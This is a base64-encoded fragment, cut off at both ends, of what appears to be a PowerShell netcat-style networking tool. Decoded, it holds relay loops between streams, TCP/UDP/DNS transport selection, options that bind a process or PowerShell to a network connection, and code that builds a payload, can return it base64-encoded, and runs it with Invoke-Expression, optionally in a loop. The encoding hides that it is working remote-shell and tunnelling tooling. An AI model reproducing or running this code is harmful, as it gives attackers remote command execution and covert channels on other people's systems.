EgPSAkRW5jb2RpbmcuR2V0Qnl0ZXMoKCRfIHwgT3V0LVN0cmluZykpfQogICAgICAgICAgICAgICAgICAgICAgICAkUHJvbXB0ID0gJEVuY29kaW5nLkdldEJ5dGVzKCgiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJERhdGEgKz0gJEludHJvUHJvbXB0CiAgICAgICAgICAgICAgICAgICAgJEludHJvUHJvbXB0ID0gJG51bGwKICAgICAgICAgICAgICAgICAgICAkRGF0YSArPSAkUmV0dXJuZWREYXRhCiAgICAgICAgICAgICAgICAgICAgJERhdGEgKz0gJFByb21wdAogICAgICAgICAgICAgICAgICAgICRDb21tYW5kVG9FeGVjdXRlID0gIiIKICAgICAgICAgICAgICAgICAgICAjIyMjIyBTdHJlYW0yIFJlYWQgIyMjIyMKCiAgICAgICAgICAgICAgICAgICAgaWYgKCREYXRhIC1uZSAkbnVsbCkgeyRTdHJlYW0xVmFycyA9IFN0cmVhbTFfV3JpdGVEYXRhICREYXRhICRTdHJlYW0xVmFyc30KICAgICAgICAgICAgICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMiB0byBTdHJlYW0gMSIgOyByZXR1cm4KICAgICAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJERhdGEsICRTdHJlYW0xVmFycyA9IFN0cmVhbTFfUmVhZERhdGEgJFN0cmVhbTFWYXJzCiAgICAgICAgICAgICAgICAgICAgaWYgKCREYXRhLkxlbmd0aCAtZXEgMCkge1N0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMTAwfQogICAgICAgICAgICAgICAgICAgIGlmICgkRGF0YSAtbmUgJG51bGwpIHskQ29tbWFuZFRvRXhlY3V0ZSA9ICRFbmNvZGluZy5HZXRTdHJpbmcoJERhdGEpfQogICAgICAgICAgICAgICAgICAgICREYXRhID0gJG51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gcmVkaXJlY3QgZGF0YSBmcm9tIFN0cmVhbSAxIHRvIFN0cmVhbSAyIiA7IHJldHVybgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZpbmFsbHkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2xvc2luZyBTdHJlYW0gMS4uLiIKICAgICAgICAgICAgICAgIFN0cmVhbTFfQ2xvc2UgJFN0cmVhbTFWYXJzCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIGNsb3NlIFN0cmVhbSAxIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgIyMjIyMjIyMjIyBQT1dFUlNIRUxMIEZVTkNUSU9OUyAjIyMjIyMjIyMjCgogICAgIyMjIyMjIyMjIyBDT05TT0xFIEZVTkNUSU9OUyAjIyMjIyMjIyMjCiAgICBmdW5jdGlvbiBTZXR1cF9Db25zb2xlIHsKICAgICAgICBwYXJhbSgkRnVuY1NldHVwVmFycykKICAgICAgICAkRnVuY1ZhcnMgPSBAe30KICAgICAgICAkRnVuY1ZhcnNbIkVuY29kaW5nIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFzY2lpRW5jb2RpbmcKICAgICAgICAkRnVuY1ZhcnNbIk91dHB1dCJdID0gJEZ1bmNTZXR1cFZhcnNbMF0KICAgICAgICAkRnVuY1ZhcnNbIk91dHB1dEJ5dGVzIl0gPSBbYnl0ZVtdXUAoKQogICAgICAgICRGdW5jVmFyc1siT3V0cHV0U3RyaW5nIl0gPSAiIgogICAgICAgIHJldHVybiAkRnVuY1ZhcnMKICAgIH0KICAgIGZ1bmN0aW9uIFJlYWREYXRhX0NvbnNvbGUgewogICAgICAgIHBhcmFtKCRGdW5jVmFycykKICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgICAgaWYgKCRIb3N0LlVJLlJhd1VJLktleUF2YWlsYWJsZSkgewogICAgICAgICAgICAkRGF0YSA9ICRGdW5jVmFyc1siRW5jb2RpbmciXS5HZXRCeXRlcygoUmVhZC1Ib3N0KSArICJgbiIpCiAgICAgICAgfQogICAgICAgIHJldHVybiAkRGF0YSwgJEZ1bmNWYXJzCiAgICB9CiAgICBmdW5jdGlvbiBXcml0ZURhdGFfQ29uc29sZSB7CiAgICAgICAgcGFyYW0oJERhdGEsICRGdW5jVmFycykKICAgICAgICBzd2l0Y2ggKCRGdW5jVmFyc1siT3V0cHV0Il0pIHsKICAgICAgICAgICAgIkhvc3QiIHtXcml0ZS1Ib3N0IC1uICRGdW5jVmFyc1siRW5jb2RpbmciXS5HZXRTdHJpbmcoJERhdGEpfQogICAgICAgICAgICAiU3RyaW5nIiB7JEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXSArPSAkRnVuY1ZhcnNbIkVuY29kaW5nIl0uR2V0U3RyaW5nKCREYXRhKX0KICAgICAgICAgICAgIkJ5dGVzIiB7JEZ1bmNWYXJzWyJPdXRwdXRCeXRlcyJdICs9ICREYXRhfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJEZ1bmNWYXJzCiAgICB9CiAgICBmdW5jdGlvbiBDbG9zZV9Db25zb2xlIHsKICAgICAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAgICAgaWYgKCRGdW5jVmFyc1siT3V0cHV0U3RyaW5nIl0gLW5lICIiKSB7cmV0dXJuICRGdW5jVmFyc1siT3V0cHV0U3RyaW5nIl19CiAgICAgICAgZWxzZWlmICgkRnVuY1ZhcnNbIk91dHB1dEJ5dGVzIl0gLW5lIEAoKSkge3JldHVybiAkRnVuY1ZhcnNbIk91dHB1dEJ5dGVzIl19CiAgICAgICAgcmV0dXJuCiAgICB9CiAgICAjIyMjIyMjIyMjIENPTlNPTEUgRlVOQ1RJT05TICMjIyMjIyMjIyMKICAKICAgICMjIyMjIyMjIyMgTUFJTiBGVU5DVElPTiAjIyMjIyMjIyMjCiAgICBmdW5jdGlvbiBNYWluIHsKICAgICAgICBwYXJhbSgkU3RyZWFtMVNldHVwVmFycywgJFN0cmVhbTJTZXR1cFZhcnMpCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgW2J5dGVbXV0kSW5wdXRUb1dyaXRlID0gQCgpCiAgICAgICAgICAgICRFbmNvZGluZyA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZwogICAgICAgICAgICBpZiAoJGkgLW5lICRudWxsKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJJbnB1dCBmcm9tIC1pIGRldGVjdGVkLi4uIgogICAgICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAkaSkgeyBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSAoW2lvLmZpbGVdOjpSZWFkQWxsQnl0ZXMoJGkpKSB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiQnl0ZVtdIikgeyBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSAkaSB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIikgeyBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSAkRW5jb2RpbmcuR2V0Qnl0ZXMoJGkpIH0KICAgICAgICAgICAgICAgIGVsc2Uge1dyaXRlLUhvc3QgIlVucmVjb2duaXNlZCBpbnB1dCB0eXBlLiIgOyByZXR1cm59CiAgICAgICAgICAgIH0KICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlNldHRpbmcgdXAgU3RyZWFtIDEuLi4iCiAgICAgICAgICAgIHRyeSB7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9TZXR1cCAkU3RyZWFtMVNldHVwVmFyc30KICAgICAgICAgICAgY2F0Y2gge1dyaXRlLVZlcmJvc2UgIlN0cmVhbSAxIFNldHVwIEZhaWx1cmUiIDsgcmV0dXJufQogICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0dGluZyB1cCBTdHJlYW0gMi4uLiIKICAgICAgICAgICAgdHJ5IHskU3RyZWFtMlZhcnMgPSBTdHJlYW0yX1NldHVwICRTdHJlYW0yU2V0dXBWYXJzfQogICAgICAgICAgICBjYXRjaCB7V3JpdGUtVmVyYm9zZSAiU3RyZWFtIDIgU2V0dXAgRmFpbHVyZSIgOyByZXR1cm59CiAgICAgIAogICAgICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgIAogICAgICAgICAgICBpZiAoJElucHV0VG9Xcml0ZSAtbmUgQCgpKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJXcml0aW5nIGlucHV0IHRvIFN0cmVhbSAxLi4uIgogICAgICAgICAgICAgICAgdHJ5IHskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1dyaXRlRGF0YSAkSW5wdXRUb1dyaXRlICRTdHJlYW0xVmFyc30KICAgICAgICAgICAgICAgIGNhdGNoIHtXcml0ZS1Ib3N0ICJGYWlsZWQgdG8gd3JpdGUgaW5wdXQgdG8gU3RyZWFtIDEiIDsgcmV0dXJufQogICAgICAgICAgICB9CiAgICAgIAogICAgICAgICAgICBpZiAoJGQpIHtXcml0ZS1WZXJib3NlICItZCAoZGlzY29ubmVjdCkgQWN0aXZhdGVkLiBEaXNjb25uZWN0aW5nLi4uIiA7IHJldHVybn0KICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkJvdGggQ29tbXVuaWNhdGlvbiBTdHJlYW1zIEVzdGFibGlzaGVkLiBSZWRpcmVjdGluZyBEYXRhIEJldHdlZW4gU3RyZWFtcy4uLiIKICAgICAgICAgICAgd2hpbGUgKCRUcnVlKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICREYXRhLCAkU3RyZWFtMlZhcnMgPSBTdHJlYW0yX1JlYWREYXRhICRTdHJlYW0yVmFycwogICAgICAgICAgICAgICAgICAgIGlmICgoJERhdGEuTGVuZ3RoIC1lcSAwKSAtb3IgKCREYXRhIC1lcSAkbnVsbCkpIHtTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDEwMH0KICAgICAgICAgICAgICAgICAgICBpZiAoJERhdGEgLW5lICRudWxsKSB7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9Xcml0ZURhdGEgJERhdGEgJFN0cmVhbTFWYXJzfQogICAgICAgICAgICAgICAgICAgICREYXRhID0gJG51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gcmVkaXJlY3QgZGF0YSBmcm9tIFN0cmVhbSAyIHRvIFN0cmVhbSAxIiA7IHJldHVybgogICAgICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkRGF0YSwgJFN0cmVhbTFWYXJzID0gU3RyZWFtMV9SZWFkRGF0YSAkU3RyZWFtMVZhcnMKICAgICAgICAgICAgICAgICAgICBpZiAoKCREYXRhLkxlbmd0aCAtZXEgMCkgLW9yICgkRGF0YSAtZXEgJG51bGwpKSB7U3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAxMDB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCREYXRhIC1uZSAkbnVsbCkgeyRTdHJlYW0yVmFycyA9IFN0cmVhbTJfV3JpdGVEYXRhICREYXRhICRTdHJlYW0yVmFyc30KICAgICAgICAgICAgICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMSB0byBTdHJlYW0gMiIgOyByZXR1cm4KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBmaW5hbGx5IHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICNXcml0ZS1WZXJib3NlICJDbG9zaW5nIFN0cmVhbSAyLi4uIgogICAgICAgICAgICAgICAgU3RyZWFtMl9DbG9zZSAkU3RyZWFtMlZhcnMKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gY2xvc2UgU3RyZWFtIDIiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICNXcml0ZS1WZXJib3NlICJDbG9zaW5nIFN0cmVhbSAxLi4uIgogICAgICAgICAgICAgICAgU3RyZWFtMV9DbG9zZSAkU3RyZWFtMVZhcnMKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gY2xvc2UgU3RyZWFtIDEiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICAjIyMjIyMjIyMjIE1BSU4gRlVOQ1RJT04gIyMjIyMjIyMjIwogIAogICAgIyMjIyMjIyMjIyBHRU5FUkFURSBQQVlMT0FEICMjIyMjIyMjIyMKICAgIGlmICgkdSkgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMTogVURQIgogICAgICAgICRGdW5jdGlvblN0cmluZyA9ICgiZnVuY3Rpb24gU3RyZWFtMV9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfVURQfSArICJgbn1gbmBuIikKICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlvbjpSZWFkRGF0YV9VRFB9ICsgImBufWBuYG4iKQogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfVURQfSArICJgbn1gbmBuIikKICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9VRFB9ICsgImBufWBuYG4iKSAgICAKICAgICAgICBpZiAoJGwpIHskSW52b2tlU3RyaW5nID0gIk1haW4gQCgnJyxgJFRydWUsJyRwJywnJHQnKSAifQogICAgICAgIGVsc2UgeyRJbnZva2VTdHJpbmcgPSAiTWFpbiBAKCckYycsYCRGYWxzZSwnJHAnLCckdCcpICJ9CiAgICB9CiAgICBlbHNlaWYgKCRkbnMgLW5lICIiKSB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0IFN0cmVhbSAxOiBETlMiCiAgICAgICAgJEZ1bmN0aW9uU3RyaW5nID0gKCJmdW5jdGlvbiBTdHJlYW0xX1NldHVwYG57YG4iICsgJHtmdW5jdGlvbjpTZXR1cF9ETlN9ICsgImBufWBuYG4iKQogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX0ROU30gKyAiYG59YG5gbiIpCiAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9ETlN9ICsgImBufWBuYG4iKQogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfQ2xvc2VgbntgbiIgKyAke2Z1bmN0aW9uOkNsb3NlX0ROU30gKyAiYG59YG5gbiIpCiAgICAgICAgaWYgKCRsKSB7cmV0dXJuICJUaGlzIGZlYXR1cmUgaXMgbm90IGF2YWlsYWJsZS4ifQogICAgICAgIGVsc2UgeyRJbnZva2VTdHJpbmcgPSAiTWFpbiBAKCckYycsJyRwJywnJGRucycsJGRuc2Z0KSAifQogICAgfQogICAgZWxzZSB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0IFN0cmVhbSAxOiBUQ1AiCiAgICAgICAgJEZ1bmN0aW9uU3RyaW5nID0gKCJmdW5jdGlvbiBTdHJlYW0xX1NldHVwYG57YG4iICsgJHtmdW5jdGlvbjpTZXR1cF9UQ1B9ICsgImBufWBuYG4iKQogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX1RDUH0gKyAiYG59YG5gbiIpCiAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9UQ1B9ICsgImBufWBuYG4iKQogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfQ2xvc2VgbntgbiIgKyAke2Z1bmN0aW9uOkNsb3NlX1RDUH0gKyAiYG59YG5gbiIpCiAgICAgICAgaWYgKCRsKSB7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJycsYCRUcnVlLCRwLCR0KSAifQogICAgICAgIGVsc2UgeyRJbnZva2VTdHJpbmcgPSAiTWFpbiBAKCckYycsYCRGYWxzZSwkcCwkdCkgIn0KICAgIH0KICAKICAgIGlmICgkZSAtbmUgIiIpIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IFByb2Nlc3MiCiAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfQ01EfSArICJgbn1gbmBuIikKICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlvbjpSZWFkRGF0YV9DTUR9ICsgImBufWBuYG4iKQogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfQ01EfSArICJgbn1gbmBuIikKICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9DTUR9ICsgImBufWBuYG4iKQogICAgICAgICRJbnZva2VTdHJpbmcgKz0gIkAoJyRlJylgbmBuIgogICAgfQogICAgZWxzZWlmICgkZXApIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IFBvd2Vyc2hlbGwiCiAgICAgICAgJEludm9rZVN0cmluZyArPSAiYG5gbiIKICAgIH0KICAgIGVsc2VpZiAoJHIgLW5lICIiKSB7CiAgICAgICAgaWYgKCRyLnNwbGl0KCI6IilbMF0uVG9Mb3dlcigpIC1lcSAidWRwIikgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IFVEUCIKICAgICAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfVURQfSArICJgbn1gbmBuIikKICAgICAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfVURQfSArICJgbn1gbmBuIikKICAgICAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9VRFB9ICsgImBufWBuYG4iKQogICAgICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9VRFB9ICsgImBufWBuYG4iKSAgICAKICAgICAgICAgICAgaWYgKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDIpIHskSW52b2tlU3RyaW5nICs9ICgiQCgnJyxgJFRydWUsJyIgKyAkci5zcGxpdCgiOiIpWzFdICsgIicsJyR0JykgIil9CiAgICAgICAgICAgIGVsc2VpZiAoJHIuc3BsaXQoIjoiKS5Db3VudCAtZXEgMykgeyRJbnZva2VTdHJpbmcgKz0gKCJAKCciICsgJHIuc3BsaXQoIjoiKVsxXSArICInLGAkRmFsc2UsJyIgKyAkci5zcGxpdCgiOiIpWzJdICsgIicsJyR0JykgIil9CiAgICAgICAgICAgIGVsc2Uge3JldHVybiAiQmFkIHJlbGF5IGZvcm1hdC4ifQogICAgICAgIH0KICAgICAgICBpZiAoJHIuc3BsaXQoIjoiKVswXS5Ub0xvd2VyKCkgLWVxICJkbnMiKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogRE5TIgogICAgICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1NldHVwYG57YG4iICsgJHtmdW5jdGlvbjpTZXR1cF9ETlN9ICsgImBufWBuYG4iKQogICAgICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlvbjpSZWFkRGF0YV9ETlN9ICsgImBufWBuYG4iKQogICAgICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX0ROU30gKyAiYG59YG5gbiIpCiAgICAgICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfQ2xvc2VgbntgbiIgKyAke2Z1bmN0aW9uOkNsb3NlX0ROU30gKyAiYG59YG5gbiIpCiAgICAgICAgICAgIGlmICgkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAyKSB7cmV0dXJuICJUaGlzIGZlYXR1cmUgaXMgbm90IGF2YWlsYWJsZS4ifQogICAgICAgICAgICBlbHNlaWYgKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDQpIHskSW52b2tlU3RyaW5nICs9ICgiQCgnIiArICRyLnNwbGl0KCI6IilbMV0gKyAiJywnIiArICRyLnNwbGl0KCI6IilbMl0gKyAiJywnIiArICRyLnNwbGl0KCI6IilbM10gKyAiJywkZG5zZnQpICIpfQogICAgICAgICAgICBlbHNlIHtyZXR1cm4gIkJhZCByZWxheSBmb3JtYXQuIn0KICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkci5zcGxpdCgiOiIpWzBdLlRvTG93ZXIoKSAtZXEgInRjcCIpIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0IFN0cmVhbSAyOiBUQ1AiCiAgICAgICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX1RDUH0gKyAiYG59YG5gbiIpCiAgICAgICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX1RDUH0gKyAiYG59YG5gbiIpCiAgICAgICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfVENQfSArICJgbn1gbmBuIikKICAgICAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfVENQfSArICJgbn1gbmBuIikKICAgICAgICAgICAgaWYgKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDIpIHskSW52b2tlU3RyaW5nICs9ICgiQCgnJyxgJFRydWUsJyIgKyAkci5zcGxpdCgiOiIpWzFdICsgIicsJyR0JykgIil9CiAgICAgICAgICAgIGVsc2VpZiAoJHIuc3BsaXQoIjoiKS5Db3VudCAtZXEgMykgeyRJbnZva2VTdHJpbmcgKz0gKCJAKCciICsgJHIuc3BsaXQoIjoiKVsxXSArICInLGAkRmFsc2UsJyIgKyAkci5zcGxpdCgiOiIpWzJdICsgIicsJyR0JykgIil9CiAgICAgICAgICAgIGVsc2Uge3JldHVybiAiQmFkIHJlbGF5IGZvcm1hdC4ifQogICAgICAgIH0KICAgIH0KICAgIGVsc2UgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogQ29uc29sZSIKICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1NldHVwYG57YG4iICsgJHtmdW5jdGlvbjpTZXR1cF9Db25zb2xlfSArICJgbn1gbmBuIikKICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlvbjpSZWFkRGF0YV9Db25zb2xlfSArICJgbn1gbmBuIikKICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX0NvbnNvbGV9ICsgImBufWBuYG4iKQogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfQ2xvc2VgbntgbiIgKyAke2Z1bmN0aW9uOkNsb3NlX0NvbnNvbGV9ICsgImBufWBuYG4iKQogICAgICAgICRJbnZva2VTdHJpbmcgKz0gKCJAKCciICsgJG8gKyAiJykiKQogICAgfQogIAogICAgaWYgKCRlcCkgeyRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIE1haW5gbntgbiIgKyAke2Z1bmN0aW9uOk1haW5fUG93ZXJzaGVsbH0gKyAiYG59YG5gbiIpfQogICAgZWxzZSB7JEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gTWFpbmBue2BuIiArICR7ZnVuY3Rpb246TWFpbn0gKyAiYG59YG5gbiIpfQogICAgJEludm9rZVN0cmluZyA9ICgkRnVuY3Rpb25TdHJpbmcgKyAkSW52b2tlU3RyaW5nKQogICAgIyMjIyMjIyMjIyBHRU5FUkFURSBQQVlMT0FEICMjIyMjIyMjIyMKICAKICAgICMjIyMjIyMjIyMgUkVUVVJOIEdFTkVSQVRFRCBQQVlMT0FEUyAjIyMjIyMjIyMjCiAgICBpZiAoJGdlKSB7V3JpdGUtVmVyYm9zZSAiUmV0dXJuaW5nIEVuY29kZWQgUGF5bG9hZC4uLiIgOyByZXR1cm4gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCRJbnZva2VTdHJpbmcpKX0KICAgIGVsc2VpZiAoJGcpIHtXcml0ZS1WZXJib3NlICJSZXR1cm5pbmcgUGF5bG9hZC4uLiIgOyByZXR1cm4gJEludm9rZVN0cmluZ30KICAgICMjIyMjIyMjIyMgUkVUVVJOIEdFTkVSQVRFRCBQQVlMT0FEUyAjIyMjIyMjIyMjCiAgCiAgICAjIyMjIyMjIyMjIEVYRUNVVElPTiAjIyMjIyMjIyMjCiAgICAkT3V0cHV0ID0gJG51bGwKICAgIHRyeSB7CiAgICAgICAgaWYgKCRyZXApIHsKICAgICAgICAgICAgd2hpbGUgKCRUcnVlKSB7CiAgICAgICAgICAgICAgICAkT3V0cHV0ICs9IElFWCAkSW52b2tlU3RyaW5nCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtcyAyCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJSZXBldGl0aW9uIEVuYWJsZWQ6IFJlc3RhcnRpbmcuLi4iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRPdXRwdXQgKz0gSUVYICRJbnZva2VTdHJpbmcKICAgICAgICB9CiAgICB9CiAgICBmaW5hbGx5IHsKICAgICAgICBpZiAoJE91dHB1dCAtbmUgJG51bGwpIHsKICAgICAgICAgICAgaWYgKCRvZiAtZXEgIiIpIHskT3V0cHV0fQogICAgICAgICAgICBlbHNlIH